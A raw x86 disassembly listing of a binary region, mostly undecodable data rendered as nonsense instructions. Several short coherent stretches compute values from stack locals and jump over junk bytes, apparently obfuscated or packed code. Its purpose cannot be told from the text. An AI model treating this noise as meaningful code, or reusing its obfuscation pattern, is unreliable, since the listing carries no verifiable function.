  40cf7d:	sbb    esp,edi
  40cf7f:	mov    esp,0xe8799f1
  40cf84:	leave  
  40cf85:	sbb    BYTE PTR ds:0xb2d638b8,bh
  40cf8b:	dec    esp
  40cf8c:	cmp    BYTE PTR [eax+ebp*4-0x17],dh
  40cf90:	mov    cl,0xf2
  40cf92:	shr    DWORD PTR [esi-0x3fb27da7],cl
  40cf98:	sub    DWORD PTR [esi],edx
  40cf9a:	ss mov esp,0x936b741f
  40cfa0:	out    0xe6,eax
  40cfa2:	jge    0x40cfcd
  40cfa4:	xor    DWORD PTR [ecx],esp
  40cfa6:	cmc    
  40cfa7:	in     al,dx
  40cfa8:	mov    ebp,0x3b5c66c0
  40cfad:	and    BYTE PTR [edi],0xc5
  40cfb0:	rcr    BYTE PTR [eax-0x4a],cl
  40cfb3:	cmp    DWORD PTR [edi-0x4ffafb9a],ebp
  40cfb9:	sbb    cl,BYTE PTR [eax+0x3e]
  40cfbc:	and    esp,DWORD PTR [edx]
  40cfbe:	jnp    0x40d019
  40cfc0:	and    BYTE PTR [ebx-0x23],dh
  40cfc3:	mov    al,ds:0xe0aa2003
  40cfc8:	sub    ecx,ebx
  40cfca:	mov    dl,0xa3
  40cfcc:	in     al,0x69
  40cfce:	add    eax,DWORD PTR [eax+0x7932a482]
  40cfd4:	(bad)  
  40cfd5:	mov    eax,edx
  40cfd7:	push   edx
  40cfd8:	(bad)  
  40cfda:	inc    ebx
  40cfdb:	dec    ebx
  40cfdc:	in     al,0x1
  40cfde:	in     eax,0x6f
  40cfe0:	daa    
  40cfe1:	add    eax,0x8e8faaee
  40cfe6:	outs   dx,BYTE PTR ds:[esi]
  40cfe7:	xchg   ebx,eax
  40cfe9:	mov    WORD PTR [edx+0x38],fs
  40cfec:	mov    ah,0x4d
  40cfee:	cmp    edx,DWORD PTR [esi-0x4ed98ea8]
  40cff4:	lods   al,BYTE PTR ds:[esi]
  40cff5:	test   al,0x31
  40cff7:	mov    bh,0x57
  40cff9:	jo     0x40cfde
  40cffb:	std    
  40cffc:	xchg   ecx,eax
  40cffd:	sub    dh,BYTE PTR [ebx-0x2a]
  40d000:	call   0xcbf8:0x2d6e5d5f
  40d007:	xor    cl,BYTE PTR [ecx+esi*8-0x3b]
  40d00b:	pop    ds
  40d00c:	sbb    DWORD PTR [esi+0x18ab344],esi
  40d012:	stc    
  40d013:	adc    DWORD PTR [esi],edx
  40d015:	xchg   ebx,ecx
  40d017:	ror    BYTE PTR [ecx+0x62b19999],cl
  40d01d:	push   ebx
  40d01e:	sti    
  40d01f:	adc    dh,BYTE PTR [edx]
  40d021:	loope  0x40d026
  40d023:	adc    DWORD PTR [ebx],0x20
  40d026:	xor    BYTE PTR [edx],dl
  40d028:	jl     0x40d05e
  40d02a:	and    bl,cl
  40d02c:	cs jecxz 0x40d002
  40d02f:	xchg   edi,eax
  40d030:	fsub   QWORD PTR [eax+0x5]
  40d033:	bound  ebp,QWORD PTR [esi-0x6a]
  40d036:	stc    
  40d037:	and    eax,0x993a9d6f
  40d03c:	or     al,0xb5
  40d03e:	out    dx,al
  40d03f:	pop    esi
  40d040:	mov    DWORD PTR [eax+0x62],eax
  40d043:	mov    ebp,0x5964db2f
  40d048:	hlt    
  40d049:	out    dx,al
  40d04a:	and    eax,0x6a7eb498
  40d04f:	inc    ebp
  40d050:	xchg   edi,eax
  40d051:	out    dx,eax
  40d052:	inc    edi
  40d053:	int    0x98
  40d055:	stc    
  40d056:	pop    ds
  40d057:	cmp    BYTE PTR [ebp+0x6],0x67
  40d05b:	lahf   
  40d05c:	(bad)
  40d060:	mov    esi,0xf0def318
  40d065:	and    DWORD PTR [eax+0x76da5cef],edi
  40d06b:	or     DWORD PTR [eax+0x20],0xfffffff9
  40d06f:	stos   BYTE PTR es:[edi],al
  40d070:	sub    bl,BYTE PTR ds:0xd2572b94
  40d076:	not    DWORD PTR [eax+0x63]
  40d079:	in     al,0xae
  40d07b:	stos   DWORD PTR es:[edi],eax
  40d07c:	ds jg  0x40d00c
  40d07f:	fwait
  40d080:	shr    BYTE PTR [ebx+eax*8+0x68],0xf1
  40d085:	dec    BYTE PTR [ebx-0x49]
  40d088:	and    dl,BYTE PTR [edi+0x6a]
  40d08b:	sar    BYTE PTR [edx-0x5a648d39],cl
  40d091:	jp     0x40d052
  40d093:	jno    0x40d0c3
  40d095:	stos   BYTE PTR es:[edi],al
  40d096:	push   0xb
  40d098:	mov    dh,0x3e
  40d09a:	ror    DWORD PTR [esi],0x65
  40d09d:	test   BYTE PTR [ebx+0x2cce5351],bh
  40d0a3:	(bad)  
  40d0a4:	jge    0x40d124
  40d0a6:	call   0xb78ed48f
  40d0ab:	test   BYTE PTR [ecx],al
  40d0ad:	imul   esi,DWORD PTR [eax],0xffffffac
  40d0b0:	xlat   BYTE PTR ds:[ebx]
  40d0b1:	sbb    edx,ebp
  40d0b3:	xchg   edx,eax
  40d0b4:	pop    bx
  40d0b6:	xor    eax,DWORD PTR [esi-0x4e]
  40d0b9:	xchg   ecx,eax
  40d0ba:	push   esi
  40d0bb:	out    dx,al
  40d0bc:	or     bl,BYTE PTR [esi-0x19648181]
  40d0c2:	icebp  
  40d0c3:	jbe    0x40c12f
  40d0c9:	mov    edx,DWORD PTR [ebp-0xc]
  40d0cc:	mov    edi,DWORD PTR [ebp-0x24]
  40d0cf:	xor    edx,eax
  40d0d1:	add    edx,ecx
  40d0d3:	imul   edx,edi
  40d0d6:	mov    edi,DWORD PTR [ebp-0x18]
  40d0d9:	xor    edi,eax
  40d0db:	add    edx,edi
  40d0dd:	jmp    0x40d49b
  40d0e2:	xor    ah,BYTE PTR [edi+ecx*8]
  40d0e5:	out    0xcd,al
  40d0e7:	icebp  
  40d0e8:	xor    esp,esi
  40d0ea:	cmp    al,0x59
  40d0ec:	lods   al,BYTE PTR ds:[esi]
  40d0ed:	les    ecx,FWORD PTR ds:0xaa613d6b
  40d0f3:	popf   
  40d0f4:	jo     0x40d166
  40d0f6:	lahf   
  40d0f7:	jge    0x40d169
  40d0f9:	jo     0x40d0ec
  40d0fb:	test   BYTE PTR [eax],0x65
  40d0fe:	xor    ah,BYTE PTR [edi+ecx*2+0x2d]
  40d102:	nop
  40d103:	test   eax,0xd9cfdba0
  40d108:	or     BYTE PTR [edi-0x67],ch
  40d10b:	sub    ecx,DWORD PTR [ecx]
  40d10d:	ins    DWORD PTR es:[edi],dx
  40d10e:	in     eax,dx
  40d10f:	addr16 sbb ebx,0xffffff9c
  40d113:	jns    0x40d134
  40d115:	test   al,0x4b
  40d117:	cmp    ah,BYTE PTR [ebx]
  40d119:	popa   
  40d11a:	adc    ch,BYTE PTR [edi-0x68c36e5b]
  40d120:	sbb    dl,BYTE PTR ds:0xe0318d1e
  40d126:	pop    ebp
  40d127:	cli    
  40d128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d129:	dec    eax
  40d12a:	ret    
  40d12b:	xchg   edx,eax
  40d12c:	mul    eax
  40d12e:	(bad)  
  40d12f:	jle    0x40d1a1
  40d131:	inc    eax
  40d132:	rcl    DWORD PTR [eax+eiz*2],1
  40d135:	and    eax,0xc7ca46e2
  40d13a:	xchg   edi,eax
  40d13b:	xchg   BYTE PTR [edi-0x30],bl
  40d13e:	sub    bh,BYTE PTR [eax]
  40d140:	push   esp
  40d141:	pop    ebp
  40d142:	jbe    0x40d18d
  40d144:	mov    WORD PTR [ecx],cs
  40d146:	mov    cl,0x0
  40d148:	jmp    0x13e9:0xcdc2feb2
  40d14f:	ds and eax,0x1b87c69f
  40d155:	xchg   ebx,eax
  40d156:	das    
  40d157:	clc    
  40d158:	lods   eax,DWORD PTR ds:[esi]
  40d159:	xchg   ebx,eax
  40d15a:	lea    ecx,[esi-0x3cacf261]
  40d160:	cmp    DWORD PTR [esp+ebx*2+0x44e00ef2],ebx
  40d167:	mov    ds,WORD PTR [esi+0x4e85fd82]
  40d16d:	inc    edi
  40d16e:	pop    ss
  40d16f:	xchg   esp,eax
  40d170:	jbe    0x40d14c
  40d172:	pop    esp
  40d173:	ins    DWORD PTR es:[edi],dx
  40d174:	xchg   esp,eax
  40d175:	xor    eax,0x33a857ae
  40d17a:	pop    ebx
  40d17b:	inc    edi
  40d17c:	xor    ah,cl
  40d17e:	jge    0x40d15b
  40d180:	xor    eax,0x3a094f7c
  40d185:	fimul  DWORD PTR [esp+esi*4-0x5b16e96d]
  40d18c:	dec    ebp
  40d18d:	cli    
  40d18e:	push   DWORD PTR [edx+0x27]
  40d191:	ret    
  40d192:	push   es
  40d193:	retf   0x4947
  40d196:	sahf   
  40d197:	adc    eax,edi
  40d199:	retf   0x87fb
  40d19c:	xchg   ecx,eax
  40d19d:	mov    edx,0x95fcb8ea
  40d1a2:	stos   BYTE PTR es:[edi],al
  40d1a3:	add    eax,0x261226fd
  40d1a8:	inc    ecx
  40d1a9:	scas   al,BYTE PTR es:[edi]
  40d1aa:	sbb    ecx,ebx
  40d1ac:	(bad)  
  40d1ad:	sbb    al,0x3e
  40d1af:	pop    ds
  40d1b0:	push   ds
  40d1b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1b2:	in     al,0x26
  40d1b4:	rcl    BYTE PTR [edi],cl
  40d1b6:	fst    st(7)
  40d1b8:	sub    al,0x4c
  40d1ba:	xchg   edx,eax
  40d1bb:	adc    DWORD PTR [edi],0x1586342c
  40d1c1:	xchg   esi,eax
  40d1c2:	mov    dl,0xd
  40d1c4:	aam    0x7
  40d1c6:	fwait
  40d1c7:	pop    ds
  40d1c8:	div    BYTE PTR [eax+edi*2-0x450d79a1]
  40d1cf:	and    al,0x5
  40d1d1:	imul   edi,DWORD PTR [edx-0x74937099],0xfaefcc38
  40d1db:	xchg   DWORD PTR [edi-0x1805aef],esp
  40d1e1:	fist   WORD PTR [eax-0x15029914]
  40d1e7:	fild   WORD PTR [ebp-0x20]
  40d1ea:	sbb    BYTE PTR [esi+0x60702de9],0x4
  40d1f1:	cmp    eax,ebp
  40d1f3:	pop    ebx
  40d1f4:	jp     0x40d23b
  40d1f6:	jbe    0x40d20e
  40d1f8:	cmp    al,BYTE PTR [ecx-0x3b]
  40d1fb:	sub    edx,esi
  40d1fd:	ja     0x40d1ba
  40d1ff:	add    eax,ecx
  40d201:	das    
  40d202:	loope  0x40d210
  40d204:	pop    eax
  40d205:	cli    
  40d206:	dec    eax
  40d207:	mov    eax,ds:0x462c25e3
  40d20c:	sbb    dl,BYTE PTR [ebx+0x5415c834]
  40d212:	test   ax,0x61ca
  40d216:	mov    eax,0xe51065b1
  40d21b:	pop    ebp
  40d21c:	hlt    
  40d21d:	jg     0x40d281
  40d21f:	xchg   edx,eax
  40d220:	jl     0x40d1e0
  40d222:	mov    eax,0x77aa8d3e
  40d227:	inc    edi
  40d228:	xchg   ebx,eax
  40d229:	dec    edx
  40d22a:	mov    dh,0x6b
  40d22c:	add    DWORD PTR [esi-0x6735d9e8],eax
  40d232:	out    dx,eax
  40d233:	mov    DWORD PTR [ecx],ecx
  40d235:	gs push eax
  40d237:	(bad)  
  40d238:	xchg   ebp,eax
  40d239:	(bad)  
  40d23a:	jmp    0x8bec2ab6
  40d23f:	loopne 0x40d256
  40d241:	in     al,0xab
  40d243:	popa   
  40d244:	stc    
  40d245:	sbb    DWORD PTR ds:0x58191748,0xe7147d9
  40d24f:	dec    ebp
  40d250:	pop    edi
  40d251:	jecxz  0x40d1ef
  40d253:	dec    esp
  40d254:	shl    esp,0xe1
  40d257:	and    bl,bh
  40d259:	adc    ecx,esp
  40d25b:	mov    cl,0x55
  40d25d:	call   0xf894:0x412bf307
  40d264:	scas   eax,DWORD PTR es:[edi]
  40d265:	je     0x40d24d
  40d267:	jmp    0xc76:0x86adfd5e
  40d26e:	mov    ah,0x33
  40d270:	xor    eax,0x9dc91be7
  40d275:	stc    
  40d276:	adc    al,0xda
  40d278:	imul   esi,eax,0xfffffffb
  40d27b:	nop
  40d27c:	dec    eax
  40d27d:	cmp    cl,ch
  40d27f:	dec    esi
  40d280:	es add al,0xcb
  40d283:	add    al,BYTE PTR [esi-0x69]
  40d286:	pop    es
  40d287:	jmp    0xa43b4cb8
  40d28c:	xor    DWORD PTR [ecx],ecx
  40d28e:	or     esi,ebx
  40d290:	push   ds
  40d291:	sbb    al,0xe9
  40d293:	jne    0x40d304
  40d295:	sahf   
  40d296:	aad    0x74
  40d298:	loope  0x40d2c8
  40d29a:	and    DWORD PTR [ecx+0x63c0807d],esi
  40d2a0:	mov    bl,0x3c
  40d2a2:	or     BYTE PTR [ebx+0x53],cl
  40d2a5:	inc    ebp
  40d2a6:	loop   0x40d26b
  40d2a8:	jae    0x40d26b
  40d2aa:	icebp  
  40d2ab:	xchg   ebp,eax
  40d2ac:	push   es
  40d2ad:	push   ds
  40d2ae:	sub    al,0xdd
  40d2b0:	ins    DWORD PTR es:[edi],dx
  40d2b1:	push   edx
  40d2b2:	sbb    DWORD PTR [edx-0x3a],eax
  40d2b5:	push   es
  40d2b6:	dec    edi
  40d2b7:	jmp    0x40d305
  40d2b9:	(bad)  
  40d2ba:	sbb    BYTE PTR [esi],bh
  40d2bc:	adc    BYTE PTR [eax],bh
  40d2be:	lods   al,BYTE PTR ds:[esi]
  40d2bf:	aad    0x5
  40d2c1:	pop    eax
  40d2c2:	adc    cl,BYTE PTR [ecx-0x6d]
  40d2c5:	push   ecx
  40d2c6:	dec    esi
  40d2c7:	pop    edx
  40d2c8:	aam    0xd0
  40d2ca:	jle    0x40d32b
  40d2cc:	jl     0x40d321
  40d2ce:	mov    bh,0x43
  40d2d0:	das    
  40d2d1:	mov    cl,0xc
  40d2d3:	fwait
  40d2d4:	mov    eax,0x51b3683f
  40d2d9:	push   0xffffffaa
  40d2db:	std    
  40d2dc:	es ror ah,1
  40d2df:	std    
  40d2e0:	dec    ebp
  40d2e1:	cmc    
  40d2e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2e3:	mov    ebx,0x486eb0f
  40d2e8:	and    DWORD PTR [edx],ebx
  40d2ea:	and    BYTE PTR [edx],dl
  40d2ec:	lahf   
  40d2ed:	sbb    eax,esp
  40d2ef:	std    
  40d2f0:	aam    0x85
  40d2f2:	ss mov esi,0x78532fbf
  40d2f8:	idiv   DWORD PTR [esi+ebx*2-0x1b]
  40d2fc:	scas   eax,DWORD PTR es:[edi]
  40d2fd:	stc    
  40d2fe:	mov    dl,0x88
  40d300:	cld    
  40d301:	or     DWORD PTR [esi-0x7f6eae96],0x105d7950
  40d30b:	fwait
  40d30c:	cmp    al,0xe0
  40d30e:	adc    al,0x41
  40d310:	or     al,0xb
  40d312:	and    eax,0x872ed8d5
  40d317:	xchg   edx,eax
  40d318:	jmp    esi
  40d31a:	ret    
  40d31b:	aad    0xa2
  40d31d:	fs mov bl,0x9
  40d320:	inc    ecx
  40d321:	mov    ebx,0x71d31c39
  40d326:	sub    ebp,DWORD PTR [edi-0x3f]
  40d329:	rcr    bh,1
  40d32b:	xor    eax,edx
  40d32d:	lahf   
  40d32e:	adc    eax,0x3e0a94b8
  40d333:	adc    al,0x1c
  40d335:	addr16 mov ah,0xff
  40d338:	and    ecx,DWORD PTR [ecx]
  40d33a:	cs mov esi,0x90e6a65a
  40d340:	mov    ds,WORD PTR [edx]
  40d342:	fsubr  QWORD PTR [ebx-0x4]
  40d345:	dec    edi
  40d346:	push   ebx
  40d347:	stos   BYTE PTR es:[edi],al
  40d348:	dec    ebx
  40d349:	lds    esi,FWORD PTR [esp+ecx*8]
  40d34c:	loop   0x40d2e0
  40d34e:	jae    0x40d32c
  40d350:	push   cs
  40d351:	mov    esi,DWORD PTR ds:0xcfd6916
  40d357:	jnp    0x40d331
  40d359:	adc    DWORD PTR [esi-0x5fcc2ba],edx
  40d35f:	test   al,0x8d
  40d361:	add    DWORD PTR [edi],esi
  40d363:	xor    ch,BYTE PTR [edi]
  40d365:	ds jo  0x40d303
  40d368:	cs inc eax
  40d36a:	inc    esp
  40d36b:	stos   DWORD PTR es:[edi],eax
  40d36c:	stos   BYTE PTR es:[edi],al
  40d36d:	sbb    edx,DWORD PTR [edx+0x53354a84]
  40d373:	jg     0x40d30b
  40d375:	push   ebx
  40d376:	lea    ebp,[esi]
  40d378:	pusha  
  40d379:	pop    esp
  40d37a:	cmp    al,0x7d
  40d37c:	rcl    DWORD PTR [esi+0x16],0xd3
  40d380:	stos   BYTE PTR es:[edi],al
  40d381:	fiadd  DWORD PTR [eax+0x4f7ed7ec]
  40d387:	xor    BYTE PTR [edi+0x48],dh
  40d38a:	jecxz  0x40d39f
  40d38c:	push   edi
  40d38d:	adc    eax,0xe44c5cfc
  40d392:	ins    BYTE PTR es:[edi],dx
  40d393:	pop    esi
  40d394:	lods   al,BYTE PTR ds:[esi]
  40d395:	(bad)  
  40d396:	pop    edx
  40d397:	lods   eax,DWORD PTR ds:[esi]
  40d398:	xchg   edi,eax
  40d399:	mov    ecx,0x56ae03e1
  40d39e:	adc    al,0x8
  40d3a0:	daa    
  40d3a1:	retf   0xdd00
  40d3a4:	inc    eax
  40d3a5:	jno    0x40d3e6
  40d3a7:	test   eax,0xb966083a
  40d3ac:	std    
  40d3ad:	adc    ebp,DWORD PTR [esi-0x492ee16a]
  40d3b3:	dec    esp
  40d3b4:	jbe    0x40d388
  40d3b6:	fwait
  40d3b7:	in     al,dx
  40d3b8:	scas   al,BYTE PTR es:[edi]
  40d3b9:	add    BYTE PTR [edx+0x7f],bl
  40d3bc:	xor    BYTE PTR [eax],dh
  40d3be:	mov    al,ds:0x917ea5fb
  40d3c3:	xchg   ecx,edx
  40d3c5:	test   BYTE PTR [eax+0x111775a5],bh
  40d3cb:	repnz pop ebp
  40d3cd:	mov    bl,0x9f
  40d3cf:	lods   al,BYTE PTR ds:[esi]
  40d3d0:	fcmovnu st,st(4)
  40d3d2:	xchg   ecx,eax
  40d3d3:	stos   DWORD PTR es:[edi],eax
  40d3d4:	xchg   BYTE PTR [eax],bl
  40d3d6:	xor    eax,0xd197aa45
  40d3db:	xor    ebx,DWORD PTR [ecx-0x41]
  40d3de:	xor    al,bh
  40d3e0:	xchg   esp,eax
  40d3e1:	js     0x40d3b8
  40d3e3:	jecxz  0x40d3c7
  40d3e5:	sbb    BYTE PTR ds:0x8f3bd198,bh
  40d3eb:	mov    edi,0x874b6f68
  40d3f0:	out    0x6d,al
  40d3f2:	mov    edi,0x776b81fd
  40d3f7:	cmp    DWORD PTR [ebp+0x4c4df0af],esp
  40d3fd:	mov    ds:0x9bd8fecc,al
  40d402:	into   
  40d403:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d404:	and    al,0xe8
  40d406:	repz retf 0x6f9d
  40d40a:	push   es
  40d40b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d40c:	and    edx,DWORD PTR [edi-0x33192c50]
  40d412:	bound  esp,QWORD PTR [edi-0x4ffd3149]
  40d418:	ficomp DWORD PTR [esi]
  40d41a:	push   ss
  40d41b:	stc    
  40d41c:	arpl   WORD PTR [eax],di
  40d41e:	adc    DWORD PTR [edx+0x4f],0x48ffeeed
  40d425:	dec    esi
  40d426:	jmp    0x40d437
  40d428:	test   al,0x52
  40d42a:	cld    
  40d42b:	(bad)  
  40d42e:	add    DWORD PTR [eax],0xf11df8ff
  40d434:	inc    ecx
  40d435:	cmc    
  40d436:	sbb    bh,BYTE PTR [ecx+ecx*8]
  40d439:	rcr    DWORD PTR ds:0x229eeb44,cl
  40d43f:	xchg   esp,eax
  40d440:	fsub   DWORD PTR [eax-0x36]
  40d443:	push   ebx
  40d444:	xor    eax,0x141be24
  40d449:	aaa    
  40d44a:	mov    dh,0xb1
  40d44c:	shl    BYTE PTR [ebx-0x38],1
  40d44f:	lea    edi,[eax+0x10]
  40d452:	mov    esi,0xea4241eb
  40d457:	inc    edi
  40d458:	or     eax,0x6db5c41d
  40d45d:	xchg   ebp,eax
  40d45e:	mov    bh,BYTE PTR [esi+ebx*2]
  40d461:	jle    0x40d4ad
  40d463:	jecxz  0x40d4a0
  40d465:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d466:	retf   0xd68c
  40d469:	cmp    BYTE PTR [eax-0x54926e6c],dh
  40d46f:	sbb    BYTE PTR [edi-0x21],ah
  40d472:	fstp   QWORD PTR [edi+0x3d]
  40d475:	int    0x78
  40d477:	js     0x40d46f
  40d479:	(bad)  
  40d47a:	lock shl DWORD PTR [edi],0x97
  40d47e:	es pop ebp
  40d480:	mov    ch,0x90
  40d482:	(bad)  
  40d483:	lock push ecx
  40d485:	scas   eax,DWORD PTR es:[edi]
  40d486:	pop    edi
  40d487:	sbb    eax,0x21510eb6
  40d48c:	and    ebx,ebp
  40d48e:	and    BYTE PTR [ecx+0x72],bl
  40d491:	dec    ebp
  40d492:	add    al,0x14
  40d494:	fbstp  TBYTE PTR [ecx]
  40d496:	pop    es
  40d497:	push   0x5c
  40d499:	jp     0x40d502
  40d49b:	mov    edi,DWORD PTR [ebp-0x8]
  40d49e:	lea    edx,[edx+edi*1+0x32729c]
  40d4a5:	mov    DWORD PTR [ebp-0x8],edx
  40d4a8:	mov    edx,DWORD PTR [ebp-0x20]
  40d4ab:	xor    edx,eax
  40d4ad:	mov    edi,0xffcd8d64
  40d4b2:	sub    edi,edx
  40d4b4:	jmp    0x40d872
  40d4b9:	out    dx,al
  40d4ba:	inc    ebx
  40d4bb:	push   0x4e
  40d4bd:	jno    0x40d534
  40d4bf:	jmp    0xdcd3:0xb81a1d63
  40d4c6:	sub    eax,edi
  40d4c8:	push   0xffffffc9
  40d4ca:	cdq    
  40d4cb:	jo     0x40d53d
  40d4cd:	lahf   
  40d4ce:	jge    0x40d540
  40d4d0:	jo     0x40d4a5
  40d4d2:	xor    al,0x25
  40d4d4:	scas   eax,DWORD PTR es:[edi]
  40d4d5:	aad    0xd
  40d4d7:	aad    0x90
  40d4d9:	jge    0x40d54f
  40d4db:	(bad)  
  40d4dc:	pusha  
  40d4dd:	jns    0x40d551
  40d4df:	push   cs
  40d4e0:	rol    DWORD PTR cs:[ecx+0x5c7abd54],0x36
  40d4e8:	mov    ?,WORD PTR [ebp-0xea0fe9d]
  40d4ee:	and    dl,0xbf
  40d4f1:	mov    es,WORD PTR [esi+0x40]
  40d4f4:	mov    eax,ds:0x1d85b258
  40d4f9:	jp     0x40d4c2
  40d4fb:	rcr    eax,1
  40d4fd:	imul   esp,eax,0x3
  40d500:	sub    al,0xf3
  40d502:	data16 jg 0x40d4ff
  40d505:	addr16 loopne 0x40d50b
  40d508:	loope  0x40d4ec
  40d50a:	mov    edi,0xa33f266
  40d50f:	les    ecx,FWORD PTR [esi+0x53b99bcb]
  40d515:	(bad)  
  40d516:	sahf   
  40d517:	ror    BYTE PTR [eax],0xdd
  40d51a:	mov    bl,BYTE PTR [edx-0x4e6dc2b8]
  40d520:	sbb    DWORD PTR [ecx+0x47a37c86],eax
  40d526:	jl     0x40d4f2
  40d528:	neg    BYTE PTR [eax]
  40d52a:	fadd   QWORD PTR [edx+ecx*4-0x4d]
  40d52e:	sbb    bh,bh
  40d530:	or     eax,0x6490d8e
  40d535:	aaa    
  40d536:	jmp    DWORD PTR [eax+0x1e]
  40d539:	xor    DWORD PTR [edx+0x42bfe995],esp
  40d53f:	(bad)
  40d543:	pop    ecx
  40d544:	fistp  WORD PTR [edi-0x78]
  40d547:	jecxz  0x40d5b6
  40d549:	lahf   
  40d54a:	(bad)  
  40d54b:	dec    edi
  40d54c:	fistp  QWORD PTR [ebx-0x734e3add]
  40d552:	mov    eax,0xfbc72612
  40d557:	nop
  40d558:	iret   
  40d559:	inc    edi
  40d55a:	cmp    esp,DWORD PTR ds:[esi-0x1e314903]
  40d561:	jmp    0x40d549
  40d563:	jae    0x40d51b
  40d565:	lods   al,BYTE PTR ds:[esi]
  40d566:	daa    
  40d567:	ds cs push esi
  40d56a:	xor    al,0xea
  40d56c:	mov    edi,0x1c5931b0
  40d571:	cs pop ds
  40d573:	mov    ah,0x17
  40d575:	jae    0x40d552
  40d577:	and    eax,0xffffffef
  40d57a:	mov    esi,ebx
  40d57c:	fdiv   st,st(6)
  40d57e:	repz popf 
  40d580:	push   ebx
  40d581:	int    0x37
  40d583:	jmp    0x14d0:0x13e4829f
  40d58a:	int    0x23
  40d58c:	and    BYTE PTR [ebx-0x3a2fb8bf],bl
  40d592:	aam    0x32
  40d594:	sub    DWORD PTR [esi+0x6d],edi
  40d597:	pop    esp
  40d598:	mov    ebp,0x8a5d74a
  40d59d:	inc    esi
  40d59e:	ret    
  40d59f:	leave  
  40d5a0:	scas   eax,DWORD PTR es:[edi]
  40d5a1:	fadd   QWORD PTR [esi-0x21d70933]
  40d5a7:	(bad)
  40d5aa:	xchg   BYTE PTR [edx+0x5cb136c8],bh
  40d5b0:	std    
  40d5b1:	adc    DWORD PTR [edi-0x2d],edi
  40d5b4:	leave  
  40d5b5:	inc    ecx
  40d5b6:	dec    edi
  40d5b7:	cmp    dl,BYTE PTR [eax]
  40d5b9:	pop    ebp
  40d5ba:	scas   al,BYTE PTR es:[edi]
  40d5bb:	test   eax,0xa3106249
  40d5c0:	jp     0x40d5c1
  40d5c2:	and    dh,BYTE PTR [ebx+0x2f384f4a]
  40d5c8:	scas   eax,DWORD PTR es:[edi]
  40d5c9:	and    DWORD PTR [edx],0x76
  40d5cc:	rol    BYTE PTR [eax],cl
  40d5ce:	mov    esi,0xc4facae5
  40d5d3:	jbe    0x40d5aa
  40d5d5:	repz aaa 
  40d5d7:	aad    0xf
  40d5d9:	rcl    DWORD PTR [esi],cl
  40d5db:	ret    
  40d5dc:	aas    
  40d5dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5de:	adc    ch,dh
  40d5e0:	cmp    ecx,DWORD PTR ds:0x94f6bb50
  40d5e6:	rcr    BYTE PTR [ecx+eiz*8+0xd],1
  40d5ea:	test   eax,0x293a3ea7
  40d5ef:	ins    DWORD PTR es:[edi],dx
  40d5f0:	push   0x2a
  40d5f2:	and    DWORD PTR [edx],ebp
  40d5f4:	push   0x5886fd35
  40d5f9:	retf   
  40d5fa:	jb     0x40d656
  40d5fc:	sbb    ebp,ebp
  40d5fe:	xor    ah,BYTE PTR [esi-0xd]
  40d601:	sbb    DWORD PTR [ebx+0x8],0x2712fa35
  40d608:	aas    
  40d609:	not    ch
  40d60b:	adc    al,0xa1
  40d60d:	jge    0x40d613
  40d60f:	pusha  
  40d610:	mov    ds:0xbcb74137,eax
  40d615:	push   esi
  40d616:	cmp    al,0x9d
  40d618:	sbb    eax,0x56d936cc
  40d61d:	in     al,0x1b
  40d61f:	jg     0x40d60b
  40d621:	jecxz  0x40d640
  40d623:	add    DWORD PTR [edx+0x16],eax
  40d626:	xchg   esp,eax
  40d627:	arpl   WORD PTR [ebx-0x4e541350],cx
  40d62d:	xor    cl,cl
  40d62f:	add    DWORD PTR [ebx],esi
  40d631:	int    0x9d
  40d633:	cmp    BYTE PTR [ecx],dh
  40d635:	dec    ecx
  40d636:	inc    ebx
  40d637:	mov    ah,0x8c
  40d639:	in     eax,dx
  40d63a:	adc    eax,DWORD PTR [edx-0x33c72aa4]
  40d640:	and    DWORD PTR [edi],ecx
  40d642:	(bad)  
  40d643:	or     DWORD PTR [ecx-0xa],edx
  40d646:	mov    dl,0xb9
  40d648:	xchg   edx,eax
  40d649:	fmul   st(5),st
  40d64b:	jmp    0x40d652
  40d64d:	fcomp  DWORD PTR [ecx-0x57]
  40d650:	test   DWORD PTR [ebx],esi
  40d652:	es add al,0xbf
  40d655:	jnp    0x40d68c
  40d657:	and    DWORD PTR [edx],esp
  40d659:	mov    ah,0xf0
  40d65b:	inc    BYTE PTR [edi-0x5]
  40d65e:	(bad)  
  40d65f:	out    0x46,eax
  40d661:	popa   
  40d662:	(bad)  
  40d663:	sahf   
  40d664:	jns    0x40d66f
  40d666:	(bad)  
  40d667:	stos   BYTE PTR es:[edi],al
  40d668:	fwait
  40d669:	push   ecx
  40d66a:	xchg   ecx,eax
  40d66b:	mov    cl,0x33
  40d66d:	out    dx,al
  40d66e:	(bad)  
  40d66f:	cmp    edx,DWORD PTR [ebp-0x1af99551]
  40d675:	std    
  40d676:	inc    esi
  40d677:	sub    al,0xc0
  40d679:	adc    BYTE PTR [edx+ecx*4],al
  40d67c:	xor    bh,BYTE PTR [eax]
  40d67e:	sbb    ebp,DWORD PTR [esi]
  40d680:	xor    al,0x15
  40d682:	es jo  0x40d698
  40d685:	jg     0x40d64c
  40d687:	loope  0x40d688
  40d689:	ficomp DWORD PTR [ecx+0x69]
  40d68c:	adc    eax,edi
  40d68e:	jmp    0xce250eb9
  40d693:	add    BYTE PTR [esi+0x4c324eee],dl
  40d699:	push   esp
  40d69a:	inc    edx
  40d69b:	js     0x40d6ab
  40d69d:	mov    dl,0x40
  40d69f:	mov    esi,0x443cbfb4
  40d6a4:	jno    0x40d661
  40d6a6:	adc    al,ch
  40d6a8:	mov    ebx,0x5dd31725
  40d6ad:	call   0xb02d8325
  40d6b2:	inc    ebp
  40d6b3:	xchg   esp,eax
  40d6b4:	push   es
  40d6b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6b6:	push   esp
  40d6b7:	pop    eax
  40d6b8:	push   ebp
  40d6b9:	xchg   edi,eax
  40d6ba:	mov    bl,0x26
  40d6bc:	sbb    al,0x48
  40d6be:	inc    edx
  40d6bf:	add    eax,0x366a7016
  40d6c4:	inc    esi
  40d6c5:	inc    ebp
  40d6c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6c7:	and    BYTE PTR ds:0x46a8f5f7,0xc5
  40d6ce:	ret    
  40d6cf:	mov    al,0x36
